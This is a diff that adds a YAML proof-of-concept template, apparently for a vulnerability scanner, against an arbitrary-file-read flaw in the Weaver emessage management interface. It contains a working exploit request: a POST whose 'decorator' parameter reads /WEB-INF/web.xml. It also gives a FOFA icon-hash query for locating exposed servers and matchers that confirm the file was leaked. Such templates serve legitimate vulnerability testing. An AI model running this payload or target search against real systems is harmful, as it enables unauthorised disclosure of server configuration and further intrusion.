@@ -1,0 +1,19 @@
+id: poc-yaml-weaver-emessage-mi-anyfile-read
+info:
+  name: 泛微 emessage 管理界面 任意文件读取漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件读取
+  finger: emessage 管理界面
+  fofa: icon_hash="-1477694668"
+requests:
+- method: POST
+  path: /
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: decorator=%2FWEB-INF%2Fweb.xml&confirm=true
+  expression: status_code == 200 && contains(body,"<display-name>") && contains(body,"</web-app>")
+    && matches(body,"<servlet-name>(.*?)</servlet-name>") && matches(body,"<filter-class>(.*?)</filter-class>")
+variables: {}
+transport: http
